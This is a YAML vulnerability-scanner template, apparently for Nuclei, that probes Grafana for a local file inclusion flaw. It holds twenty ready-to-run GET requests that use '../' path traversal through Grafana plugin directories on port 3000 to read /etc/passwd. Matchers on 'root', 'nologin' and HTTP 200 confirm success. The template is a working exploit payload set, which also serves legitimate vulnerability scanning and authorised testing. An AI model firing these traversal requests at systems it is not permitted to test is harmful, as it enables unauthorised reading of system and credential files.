id: Grafana_Lfi

info:
  name: Grafana_Lfi
  author: huowuzhao
  severity: high
  tags: exposure,Grafana

requests:
  - method: GET
    path:
      - "{{BaseURL}}:3000/public/plugins/elasticsearch/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/alertmanager/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/cloud-monitoring/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/cloudwatch/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/dashboard/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/grafana/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/graphite/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/influxdb/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/jaeger/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/loki/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/mixed/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/mssql/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/mysql/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/opentsdb/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/postgres/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/prometheus/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/tempo/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/testdata/../../../../../../../../etc/passwd"
      - "{{BaseURL}}:3000/public/plugins/zipkin/../../../../../../../../etc/passwd"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root"
          - "nologin"
        condition: or
        
      - type: status
        status:
          - 200
